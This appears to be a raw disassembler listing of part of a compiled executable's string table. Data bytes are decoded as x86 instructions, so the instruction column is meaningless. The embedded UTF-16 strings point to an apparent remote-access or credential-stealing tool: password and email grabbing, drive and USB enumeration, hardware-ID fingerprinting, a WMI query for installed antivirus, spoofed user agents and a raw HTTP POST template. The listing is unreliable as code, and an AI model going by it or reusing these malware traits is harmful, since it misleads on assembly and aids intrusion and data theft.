  40a78c:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40a790:	2b 00                	sub    (%eax),%eax
  40a792:	00 0b                	add    %cl,(%ebx)
  40a794:	50                   	push   %eax
  40a795:	00 61 00             	add    %ah,0x0(%ecx)
  40a798:	73 00                	jae    0x40a79a
  40a79a:	73 00                	jae    0x40a79c
  40a79c:	52                   	push   %edx
  40a79d:	00 00                	add    %al,(%eax)
  40a79f:	07                   	pop    %es
  40a7a0:	50                   	push   %eax
  40a7a1:	00 43 00             	add    %al,0x0(%ebx)
  40a7a4:	23 00                	and    (%eax),%eax
  40a7a6:	00 0f                	add    %cl,(%edi)
  40a7a8:	47                   	inc    %edi
  40a7a9:	00 65 00             	add    %ah,0x0(%ebp)
  40a7ac:	74 00                	je     0x40a7ae
  40a7ae:	70 00                	jo     0x40a7b0
  40a7b0:	61                   	popa
  40a7b1:	00 73 00             	add    %dh,0x0(%ebx)
  40a7b4:	73 00                	jae    0x40a7b6
  40a7b6:	00 07                	add    %al,(%edi)
  40a7b8:	67 00 65 00          	add    %ah,0x0(%di)
  40a7bc:	74 00                	je     0x40a7be
  40a7be:	00 0d 50 00 76 00    	add    %cl,0x760050
  40a7c4:	62 00                	bound  %eax,(%eax)
  40a7c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7c7:	00 65 00             	add    %ah,0x0(%ebp)
  40a7ca:	74 00                	je     0x40a7cc
  40a7cc:	00 09                	add    %cl,(%ecx)
  40a7ce:	57                   	push   %edi
  40a7cf:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40a7d3:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40a7d7:	0b 45 00             	or     0x0(%ebp),%eax
  40a7da:	6d                   	insl   (%dx),%es:(%edi)
  40a7db:	00 61 00             	add    %ah,0x0(%ecx)
  40a7de:	69 00 6c 00 00 0d    	imul   $0xd00006c,(%eax),%eax
  40a7e4:	45                   	inc    %ebp
  40a7e5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7e8:	61                   	popa
  40a7e9:	00 69 00             	add    %ch,0x0(%ecx)
  40a7ec:	6c                   	insb   (%dx),%es:(%edi)
  40a7ed:	00 73 00             	add    %dh,0x0(%ebx)
  40a7f0:	00 0d 45 00 72 00    	add    %cl,0x720045
  40a7f6:	72 00                	jb     0x40a7f8
  40a7f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7f9:	00 72 00             	add    %dh,0x0(%edx)
  40a7fc:	21 00                	and    %eax,(%eax)
  40a7fe:	00 0b                	add    %cl,(%ebx)
  40a800:	58                   	pop    %eax
  40a801:	00 63 00             	add    %ah,0x0(%ebx)
  40a804:	68 00 61 00 74       	push   $0x74006100
  40a809:	00 00                	add    %al,(%eax)
  40a80b:	0d 4c 00 4c 00       	or     $0x4c004c,%eax
  40a810:	43                   	inc    %ebx
  40a811:	00 48 00             	add    %cl,0x0(%eax)
  40a814:	41                   	inc    %ecx
  40a815:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40a819:	0b 53 00             	or     0x0(%ebx),%edx
  40a81c:	4e                   	dec    %esi
  40a81d:	00 6f 00             	add    %ch,0x0(%edi)
  40a820:	74 00                	je     0x40a822
  40a822:	65 00 00             	add    %al,%gs:(%eax)
  40a825:	05 4e 00 54 00       	add    $0x54004e,%eax
  40a82a:	00 11                	add    %dl,(%ecx)
  40a82c:	5b                   	pop    %ebx
  40a82d:	00 46 00             	add    %al,0x0(%esi)
  40a830:	6f                   	outsl  %ds:(%esi),(%dx)
  40a831:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40a835:	00 65 00             	add    %ah,0x0(%ebp)
  40a838:	72 00                	jb     0x40a83a
  40a83a:	5d                   	pop    %ebp
  40a83b:	00 00                	add    %al,(%eax)
  40a83d:	41                   	inc    %ecx
  40a83e:	46                   	inc    %esi
  40a83f:	00 69 00             	add    %ch,0x0(%ecx)
  40a842:	6c                   	insb   (%dx),%es:(%edi)
  40a843:	00 65 00             	add    %ah,0x0(%ebp)
  40a846:	4d                   	dec    %ebp
  40a847:	00 61 00             	add    %ah,0x0(%ecx)
  40a84a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a84b:	00 61 00             	add    %ah,0x0(%ecx)
  40a84e:	67 00 65 00          	add    %ah,0x0(%di)
  40a852:	72 00                	jb     0x40a854
  40a854:	53                   	push   %ebx
  40a855:	00 70 00             	add    %dh,0x0(%eax)
  40a858:	6c                   	insb   (%dx),%es:(%edi)
  40a859:	00 69 00             	add    %ch,0x0(%ecx)
  40a85c:	74 00                	je     0x40a85e
  40a85e:	46                   	inc    %esi
  40a85f:	00 69 00             	add    %ch,0x0(%ecx)
  40a862:	6c                   	insb   (%dx),%es:(%edi)
  40a863:	00 65 00             	add    %ah,0x0(%ebp)
  40a866:	4d                   	dec    %ebp
  40a867:	00 61 00             	add    %ah,0x0(%ecx)
  40a86a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86b:	00 61 00             	add    %ah,0x0(%ecx)
  40a86e:	67 00 65 00          	add    %ah,0x0(%di)
  40a872:	72 00                	jb     0x40a874
  40a874:	53                   	push   %ebx
  40a875:	00 70 00             	add    %dh,0x0(%eax)
  40a878:	6c                   	insb   (%dx),%es:(%edi)
  40a879:	00 69 00             	add    %ch,0x0(%ecx)
  40a87c:	74 00                	je     0x40a87e
  40a87e:	00 07                	add    %al,(%edi)
  40a880:	2a 00                	sub    (%eax),%al
  40a882:	2e 00 2a             	add    %ch,%cs:(%edx)
  40a885:	00 00                	add    %al,(%eax)
  40a887:	21 46 00             	and    %eax,0x0(%esi)
  40a88a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a890:	4d                   	dec    %ebp
  40a891:	00 61 00             	add    %ah,0x0(%ecx)
  40a894:	6e                   	outsb  %ds:(%esi),(%dx)
  40a895:	00 61 00             	add    %ah,0x0(%ecx)
  40a898:	67 00 65 00          	add    %ah,0x0(%di)
  40a89c:	72 00                	jb     0x40a89e
  40a89e:	53                   	push   %ebx
  40a89f:	00 70 00             	add    %dh,0x0(%eax)
  40a8a2:	6c                   	insb   (%dx),%es:(%edi)
  40a8a3:	00 69 00             	add    %ch,0x0(%ecx)
  40a8a6:	74 00                	je     0x40a8a8
  40a8a8:	00 0f                	add    %cl,(%edi)
  40a8aa:	5b                   	pop    %ebx
  40a8ab:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40a8af:	00 69 00             	add    %ch,0x0(%ecx)
  40a8b2:	76 00                	jbe    0x40a8b4
  40a8b4:	65 00 5d 00          	add    %bl,%gs:0x0(%ebp)
  40a8b8:	00 09                	add    %cl,(%ecx)
  40a8ba:	5b                   	pop    %ebx
  40a8bb:	00 43 00             	add    %al,0x0(%ebx)
  40a8be:	44                   	inc    %esp
  40a8bf:	00 5d 00             	add    %bl,0x0(%ebp)
  40a8c2:	00 0b                	add    %cl,(%ebx)
  40a8c4:	5b                   	pop    %ebx
  40a8c5:	00 55 00             	add    %dl,0x0(%ebp)
  40a8c8:	53                   	push   %ebx
  40a8c9:	00 42 00             	add    %al,0x0(%edx)
  40a8cc:	5d                   	pop    %ebp
  40a8cd:	00 00                	add    %al,(%eax)
  40a8cf:	0b 5b 00             	or     0x0(%ebx),%ebx
  40a8d2:	4e                   	dec    %esi
  40a8d3:	00 45 00             	add    %al,0x0(%ebp)
  40a8d6:	54                   	push   %esp
  40a8d7:	00 5d 00             	add    %bl,0x0(%ebp)
  40a8da:	00 0b                	add    %cl,(%ebx)
  40a8dc:	53                   	push   %ebx
  40a8dd:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a8e1:	00 72 00             	add    %dh,0x0(%edx)
  40a8e4:	74 00                	je     0x40a8e6
  40a8e6:	00 0b                	add    %cl,(%ebx)
  40a8e8:	6c                   	insb   (%dx),%es:(%edi)
  40a8e9:	00 6f 00             	add    %ch,0x0(%edi)
  40a8ec:	67 00 64 00          	add    %ah,0x0(%si)
  40a8f0:	66 00 00             	data16 add %al,(%eax)
  40a8f3:	80 9b 4d 00 6f 00 7a 	sbbb   $0x7a,0x6f004d(%ebx)
  40a8fa:	00 69 00             	add    %ch,0x0(%ecx)
  40a8fd:	6c                   	insb   (%dx),%es:(%edi)
  40a8fe:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a902:	00 2f                	add    %ch,(%edi)
  40a904:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40a90a:	00 20                	add    %ah,(%eax)
  40a90c:	00 28                	add    %ch,(%eax)
  40a90e:	00 57 00             	add    %dl,0x0(%edi)
  40a911:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a917:	6f                   	outsl  %ds:(%esi),(%dx)
  40a918:	00 77 00             	add    %dh,0x0(%edi)
  40a91b:	73 00                	jae    0x40a91d
  40a91d:	20 00                	and    %al,(%eax)
  40a91f:	4e                   	dec    %esi
  40a920:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40a924:	00 36                	add    %dh,(%esi)
  40a926:	00 2e                	add    %ch,(%esi)
  40a928:	00 31                	add    %dh,(%ecx)
  40a92a:	00 3b                	add    %bh,(%ebx)
  40a92c:	00 20                	add    %ah,(%eax)
  40a92e:	00 57 00             	add    %dl,0x0(%edi)
  40a931:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40a937:	34 00                	xor    $0x0,%al
  40a939:	3b 00                	cmp    (%eax),%eax
  40a93b:	20 00                	and    %al,(%eax)
  40a93d:	78 00                	js     0x40a93f
  40a93f:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a943:	3b 00                	cmp    (%eax),%eax
  40a945:	20 00                	and    %al,(%eax)
  40a947:	72 00                	jb     0x40a949
  40a949:	76 00                	jbe    0x40a94b
  40a94b:	3a 00                	cmp    (%eax),%al
  40a94d:	36 00 36             	add    %dh,%ss:(%esi)
  40a950:	00 2e                	add    %ch,(%esi)
  40a952:	00 30                	add    %dh,(%eax)
  40a954:	00 29                	add    %ch,(%ecx)
  40a956:	00 20                	add    %ah,(%eax)
  40a958:	00 47 00             	add    %al,0x0(%edi)
  40a95b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a95f:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a962:	00 2f                	add    %ch,(%edi)
  40a964:	00 32                	add    %dh,(%edx)
  40a966:	00 30                	add    %dh,(%eax)
  40a968:	00 31                	add    %dh,(%ecx)
  40a96a:	00 30                	add    %dh,(%eax)
  40a96c:	00 30                	add    %dh,(%eax)
  40a96e:	00 31                	add    %dh,(%ecx)
  40a970:	00 30                	add    %dh,(%eax)
  40a972:	00 31                	add    %dh,(%ecx)
  40a974:	00 20                	add    %ah,(%eax)
  40a976:	00 46 00             	add    %al,0x0(%esi)
  40a979:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40a97f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a983:	78 00                	js     0x40a985
  40a985:	2f                   	das
  40a986:	00 36                	add    %dh,(%esi)
  40a988:	00 36                	add    %dh,(%esi)
  40a98a:	00 2e                	add    %ch,(%esi)
  40a98c:	00 30                	add    %dh,(%eax)
  40a98e:	00 00                	add    %al,(%eax)
  40a990:	81 13 4d 00 6f 00    	adcl   $0x6f004d,(%ebx)
  40a996:	7a 00                	jp     0x40a998
  40a998:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40a99e:	61                   	popa
  40a99f:	00 2f                	add    %ch,(%edi)
  40a9a1:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40a9a7:	00 20                	add    %ah,(%eax)
  40a9a9:	00 28                	add    %ch,(%eax)
  40a9ab:	00 69 00             	add    %ch,0x0(%ecx)
  40a9ae:	50                   	push   %eax
  40a9af:	00 68 00             	add    %ch,0x0(%eax)
  40a9b2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9b3:	00 6e 00             	add    %ch,0x0(%esi)
  40a9b6:	65 00 3b             	add    %bh,%gs:(%ebx)
  40a9b9:	00 20                	add    %ah,(%eax)
  40a9bb:	00 43 00             	add    %al,0x0(%ebx)
  40a9be:	50                   	push   %eax
  40a9bf:	00 55 00             	add    %dl,0x0(%ebp)
  40a9c2:	20 00                	and    %al,(%eax)
  40a9c4:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  40a9ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9cb:	00 6e 00             	add    %ch,0x0(%esi)
  40a9ce:	65 00 20             	add    %ah,%gs:(%eax)
  40a9d1:	00 4f 00             	add    %cl,0x0(%edi)
  40a9d4:	53                   	push   %ebx
  40a9d5:	00 20                	add    %ah,(%eax)
  40a9d7:	00 31                	add    %dh,(%ecx)
  40a9d9:	00 31                	add    %dh,(%ecx)
  40a9db:	00 5f 00             	add    %bl,0x0(%edi)
  40a9de:	34 00                	xor    $0x0,%al
  40a9e0:	5f                   	pop    %edi
  40a9e1:	00 31                	add    %dh,(%ecx)
  40a9e3:	00 20                	add    %ah,(%eax)
  40a9e5:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a9e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9ec:	65 00 20             	add    %ah,%gs:(%eax)
  40a9ef:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9f2:	61                   	popa
  40a9f3:	00 63 00             	add    %ah,0x0(%ebx)
  40a9f6:	20 00                	and    %al,(%eax)
  40a9f8:	4f                   	dec    %edi
  40a9f9:	00 53 00             	add    %dl,0x0(%ebx)
  40a9fc:	20 00                	and    %al,(%eax)
  40a9fe:	58                   	pop    %eax
  40a9ff:	00 29                	add    %ch,(%ecx)
  40aa01:	00 20                	add    %ah,(%eax)
  40aa03:	00 41 00             	add    %al,0x0(%ecx)
  40aa06:	70 00                	jo     0x40aa08
  40aa08:	70 00                	jo     0x40aa0a
  40aa0a:	6c                   	insb   (%dx),%es:(%edi)
  40aa0b:	00 65 00             	add    %ah,0x0(%ebp)
  40aa0e:	57                   	push   %edi
  40aa0f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa12:	62 00                	bound  %eax,(%eax)
  40aa14:	4b                   	dec    %ebx
  40aa15:	00 69 00             	add    %ch,0x0(%ecx)
  40aa18:	74 00                	je     0x40aa1a
  40aa1a:	2f                   	das
  40aa1b:	00 36                	add    %dh,(%esi)
  40aa1d:	00 30                	add    %dh,(%eax)
  40aa1f:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  40aa25:	00 2e                	add    %ch,(%esi)
  40aa27:	00 31                	add    %dh,(%ecx)
  40aa29:	00 35 00 20 00 28    	add    %dh,0x28002000
  40aa2f:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa32:	48                   	dec    %eax
  40aa33:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40aa37:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40aa3b:	00 20                	add    %ah,(%eax)
  40aa3d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40aa41:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa44:	65 00 20             	add    %ah,%gs:(%eax)
  40aa47:	00 47 00             	add    %al,0x0(%edi)
  40aa4a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40aa4e:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40aa51:	00 29                	add    %ch,(%ecx)
  40aa53:	00 20                	add    %ah,(%eax)
  40aa55:	00 56 00             	add    %dl,0x0(%esi)
  40aa58:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aa5c:	73 00                	jae    0x40aa5e
  40aa5e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40aa64:	2f                   	das
  40aa65:	00 31                	add    %dh,(%ecx)
  40aa67:	00 31                	add    %dh,(%ecx)
  40aa69:	00 2e                	add    %ch,(%esi)
  40aa6b:	00 30                	add    %dh,(%eax)
  40aa6d:	00 20                	add    %ah,(%eax)
  40aa6f:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa72:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa73:	00 62 00             	add    %ah,0x0(%edx)
  40aa76:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40aa7c:	2f                   	das
  40aa7d:	00 31                	add    %dh,(%ecx)
  40aa7f:	00 35 00 45 00 31    	add    %dh,0x31004500
  40aa85:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa88:	38 00                	cmp    %al,(%eax)
  40aa8a:	20 00                	and    %al,(%eax)
  40aa8c:	53                   	push   %ebx
  40aa8d:	00 61 00             	add    %ah,0x0(%ecx)
  40aa90:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40aa94:	72 00                	jb     0x40aa96
  40aa96:	69 00 2f 00 36 00    	imul   $0x36002f,(%eax),%eax
  40aa9c:	30 00                	xor    %al,(%eax)
  40aa9e:	34 00                	xor    $0x0,%al
  40aaa0:	2e 00 31             	add    %dh,%cs:(%ecx)
  40aaa3:	00 00                	add    %al,(%eax)
  40aaa5:	80 e7 4d             	and    $0x4d,%bh
  40aaa8:	00 6f 00             	add    %ch,0x0(%edi)
  40aaab:	7a 00                	jp     0x40aaad
  40aaad:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40aab3:	61                   	popa
  40aab4:	00 2f                	add    %ch,(%edi)
  40aab6:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40aabc:	00 20                	add    %ah,(%eax)
  40aabe:	00 28                	add    %ch,(%eax)
  40aac0:	00 57 00             	add    %dl,0x0(%edi)
  40aac3:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40aac9:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaca:	00 77 00             	add    %dh,0x0(%edi)
  40aacd:	73 00                	jae    0x40aacf
  40aacf:	20 00                	and    %al,(%eax)
  40aad1:	4e                   	dec    %esi
  40aad2:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40aad6:	00 31                	add    %dh,(%ecx)
  40aad8:	00 30                	add    %dh,(%eax)
  40aada:	00 2e                	add    %ch,(%esi)
  40aadc:	00 30                	add    %dh,(%eax)
  40aade:	00 3b                	add    %bh,(%ebx)
  40aae0:	00 20                	add    %ah,(%eax)
  40aae2:	00 57 00             	add    %dl,0x0(%edi)
  40aae5:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40aaeb:	34 00                	xor    $0x0,%al
  40aaed:	3b 00                	cmp    (%eax),%eax
  40aaef:	20 00                	and    %al,(%eax)
  40aaf1:	78 00                	js     0x40aaf3
  40aaf3:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40aaf7:	29 00                	sub    %eax,(%eax)
  40aaf9:	20 00                	and    %al,(%eax)
  40aafb:	41                   	inc    %ecx
  40aafc:	00 70 00             	add    %dh,0x0(%eax)
  40aaff:	70 00                	jo     0x40ab01
  40ab01:	6c                   	insb   (%dx),%es:(%edi)
  40ab02:	00 65 00             	add    %ah,0x0(%ebp)
  40ab05:	57                   	push   %edi
  40ab06:	00 65 00             	add    %ah,0x0(%ebp)
  40ab09:	62 00                	bound  %eax,(%eax)
  40ab0b:	4b                   	dec    %ebx
  40ab0c:	00 69 00             	add    %ch,0x0(%ecx)
  40ab0f:	74 00                	je     0x40ab11
  40ab11:	2f                   	das
  40ab12:	00 35 00 33 00 37    	add    %dh,0x37003300
  40ab18:	00 2e                	add    %ch,(%esi)
  40ab1a:	00 33                	add    %dh,(%ebx)
  40ab1c:	00 36                	add    %dh,(%esi)
  40ab1e:	00 20                	add    %ah,(%eax)
  40ab20:	00 28                	add    %ch,(%eax)
  40ab22:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab25:	48                   	dec    %eax
  40ab26:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40ab2a:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40ab2e:	00 20                	add    %ah,(%eax)
  40ab30:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40ab34:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab37:	65 00 20             	add    %ah,%gs:(%eax)
  40ab3a:	00 47 00             	add    %al,0x0(%edi)
  40ab3d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ab41:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40ab44:	00 29                	add    %ch,(%ecx)
  40ab46:	00 20                	add    %ah,(%eax)
  40ab48:	00 43 00             	add    %al,0x0(%ebx)
  40ab4b:	68 00 72 00 6f       	push   $0x6f007200
  40ab50:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab53:	65 00 2f             	add    %ch,%gs:(%edi)
  40ab56:	00 36                	add    %dh,(%esi)
  40ab58:	00 30                	add    %dh,(%eax)
  40ab5a:	00 2e                	add    %ch,(%esi)
  40ab5c:	00 30                	add    %dh,(%eax)
  40ab5e:	00 2e                	add    %ch,(%esi)
  40ab60:	00 33                	add    %dh,(%ebx)
  40ab62:	00 31                	add    %dh,(%ecx)
  40ab64:	00 31                	add    %dh,(%ecx)
  40ab66:	00 32                	add    %dh,(%edx)
  40ab68:	00 2e                	add    %ch,(%esi)
  40ab6a:	00 31                	add    %dh,(%ecx)
  40ab6c:	00 31                	add    %dh,(%ecx)
  40ab6e:	00 33                	add    %dh,(%ebx)
  40ab70:	00 20                	add    %ah,(%eax)
  40ab72:	00 53 00             	add    %dl,0x0(%ebx)
  40ab75:	61                   	popa
  40ab76:	00 66 00             	add    %ah,0x0(%esi)
  40ab79:	61                   	popa
  40ab7a:	00 72 00             	add    %dh,0x0(%edx)
  40ab7d:	69 00 2f 00 35 00    	imul   $0x35002f,(%eax),%eax
  40ab83:	33 00                	xor    (%eax),%eax
  40ab85:	37                   	aaa
  40ab86:	00 2e                	add    %ch,(%esi)
  40ab88:	00 33                	add    %dh,(%ebx)
  40ab8a:	00 36                	add    %dh,(%esi)
  40ab8c:	00 00                	add    %al,(%eax)
  40ab8e:	11 45 00             	adc    %eax,0x0(%ebp)
  40ab91:	72 00                	jb     0x40ab93
  40ab93:	72 00                	jb     0x40ab95
  40ab95:	20 00                	and    %al,(%eax)
  40ab97:	48                   	dec    %eax
  40ab98:	00 57 00             	add    %dl,0x0(%edi)
  40ab9b:	49                   	dec    %ecx
  40ab9c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40aba0:	05 78 00 32 00       	add    $0x320078,%eax
  40aba5:	00 0d 43 00 6c 00    	add    %cl,0x6c0043
  40abab:	61                   	popa
  40abac:	00 73 00             	add    %dh,0x0(%ebx)
  40abaf:	73 00                	jae    0x40abb1
  40abb1:	31 00                	xor    %eax,(%eax)
  40abb3:	00 03                	add    %al,(%ebx)
  40abb5:	2e 00 00             	add    %al,%cs:(%eax)
  40abb8:	13 64 00 64          	adc    0x64(%eax,%eax,1),%esp
  40abbc:	00 2f                	add    %ch,(%edi)
  40abbe:	00 4d 00             	add    %cl,0x0(%ebp)
  40abc1:	4d                   	dec    %ebp
  40abc2:	00 2f                	add    %ch,(%edi)
  40abc4:	00 79 00             	add    %bh,0x0(%ecx)
  40abc7:	79 00                	jns    0x40abc9
  40abc9:	79 00                	jns    0x40abcb
  40abcb:	00 0f                	add    %cl,(%edi)
  40abcd:	4e                   	dec    %esi
  40abce:	00 6f 00             	add    %ch,0x0(%edi)
  40abd1:	74 00                	je     0x40abd3
  40abd3:	68 00 69 00 6e       	push   $0x6e006900
  40abd8:	00 67 00             	add    %ah,0x0(%edi)
  40abdb:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40abe1:	00 2b                	add    %ch,(%ebx)
  40abe3:	5c                   	pop    %esp
  40abe4:	00 72 00             	add    %dh,0x0(%edx)
  40abe7:	6f                   	outsl  %ds:(%esi),(%dx)
  40abe8:	00 6f 00             	add    %ch,0x0(%edi)
  40abeb:	74 00                	je     0x40abed
  40abed:	5c                   	pop    %esp
  40abee:	00 53 00             	add    %dl,0x0(%ebx)
  40abf1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40abf5:	75 00                	jne    0x40abf7
  40abf7:	72 00                	jb     0x40abf9
  40abf9:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40abff:	43                   	inc    %ebx
  40ac00:	00 65 00             	add    %ah,0x0(%ebp)
  40ac03:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac04:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ac08:	00 72 00             	add    %dh,0x0(%edx)
  40ac0b:	32 00                	xor    (%eax),%al
  40ac0d:	00 3d 53 00 65 00    	add    %bh,0x650053
  40ac13:	6c                   	insb   (%dx),%es:(%edi)
  40ac14:	00 65 00             	add    %ah,0x0(%ebp)
  40ac17:	63 00                	arpl   %eax,(%eax)
  40ac19:	74 00                	je     0x40ac1b
  40ac1b:	20 00                	and    %al,(%eax)
  40ac1d:	2a 00                	sub    (%eax),%al
  40ac1f:	20 00                	and    %al,(%eax)
  40ac21:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40ac25:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac26:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac29:	20 00                	and    %al,(%eax)
  40ac2b:	41                   	inc    %ecx
  40ac2c:	00 6e 00             	add    %ch,0x0(%esi)
  40ac2f:	74 00                	je     0x40ac31
  40ac31:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40ac37:	72 00                	jb     0x40ac39
  40ac39:	75 00                	jne    0x40ac3b
  40ac3b:	73 00                	jae    0x40ac3d
  40ac3d:	50                   	push   %eax
  40ac3e:	00 72 00             	add    %dh,0x0(%edx)
  40ac41:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac42:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40ac46:	00 63 00             	add    %ah,0x0(%ebx)
  40ac49:	74 00                	je     0x40ac4b
  40ac4b:	00 17                	add    %dl,(%edi)
  40ac4d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40ac51:	73 00                	jae    0x40ac53
  40ac53:	70 00                	jo     0x40ac55
  40ac55:	6c                   	insb   (%dx),%es:(%edi)
  40ac56:	00 61 00             	add    %ah,0x0(%ecx)
  40ac59:	79 00                	jns    0x40ac5b
  40ac5b:	4e                   	dec    %esi
  40ac5c:	00 61 00             	add    %ah,0x0(%ecx)
  40ac5f:	6d                   	insl   (%dx),%es:(%edi)
  40ac60:	00 65 00             	add    %ah,0x0(%ebp)
  40ac63:	00 03                	add    %al,(%ebx)
  40ac65:	2c 00                	sub    $0x0,%al
  40ac67:	00 09                	add    %cl,(%ecx)
  40ac69:	4e                   	dec    %esi
  40ac6a:	00 6f 00             	add    %ch,0x0(%edi)
  40ac6d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac6e:	00 65 00             	add    %ah,0x0(%ebp)
  40ac71:	00 2f                	add    %ch,(%edi)
  40ac73:	50                   	push   %eax
  40ac74:	00 4f 00             	add    %cl,0x0(%edi)
  40ac77:	53                   	push   %ebx
  40ac78:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40ac7c:	00 2f                	add    %ch,(%edi)
  40ac7e:	00 20                	add    %ah,(%eax)
  40ac80:	00 48 00             	add    %cl,0x0(%eax)
  40ac83:	54                   	push   %esp
  40ac84:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40ac88:	00 2f                	add    %ch,(%edi)
  40ac8a:	00 31                	add    %dh,(%ecx)
  40ac8c:	00 2e                	add    %ch,(%esi)
  40ac8e:	00 31                	add    %dh,(%ecx)
  40ac90:	00 0d 00 0a 00 48    	add    %cl,0x48000a00
  40ac96:	00 6f 00             	add    %ch,0x0(%edi)
  40ac99:	73 00                	jae    0x40ac9b
  40ac9b:	74 00                	je     0x40ac9d
  40ac9d:	3a 00                	cmp    (%eax),%al
  40ac9f:	20 00                	and    %al,(%eax)
  40aca1:	00 80 af 0d 00 0a    	add    %al,0xa000daf(%eax)
  40aca7:	00 43 00             	add    %al,0x0(%ebx)
  40acaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40acab:	00 6e 00             	add    %ch,0x0(%esi)
  40acae:	6e                   	outsb  %ds:(%esi),(%dx)
  40acaf:	00 65 00             	add    %ah,0x0(%ebp)
  40acb2:	63 00                	arpl   %eax,(%eax)
  40acb4:	74 00                	je     0x40acb6
  40acb6:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40acbc:	3a 00                	cmp    (%eax),%al
  40acbe:	20 00                	and    %al,(%eax)
  40acc0:	6b 00 65             	imul   $0x65,(%eax),%eax
  40acc3:	00 65 00             	add    %ah,0x0(%ebp)
  40acc6:	70 00                	jo     0x40acc8
  40acc8:	2d 00 61 00 6c       	sub    $0x6c006100,%eax
  40accd:	00 69 00             	add    %ch,0x0(%ecx)
  40acd0:	76 00                	jbe    0x40acd2
  40acd2:	65 00 0d 00 0a 00 43 	add    %cl,%gs:0x43000a00
  40acd9:	00 6f 00             	add    %ch,0x0(%edi)
  40acdc:	6e                   	outsb  %ds:(%esi),(%dx)
  40acdd:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ace1:	00 6e 00             	add    %ch,0x0(%esi)
  40ace4:	74 00                	je     0x40ace6
  40ace6:	2d 00 54 00 79       	sub    $0x79005400,%eax
  40aceb:	00 70 00             	add    %dh,0x0(%eax)
  40acee:	65 00 3a             	add    %bh,%gs:(%edx)
  40acf1:	00 20                	add    %ah,(%eax)
  40acf3:	00 61 00             	add    %ah,0x0(%ecx)
  40acf6:	70 00                	jo     0x40acf8
  40acf8:	70 00                	jo     0x40acfa
  40acfa:	6c                   	insb   (%dx),%es:(%edi)
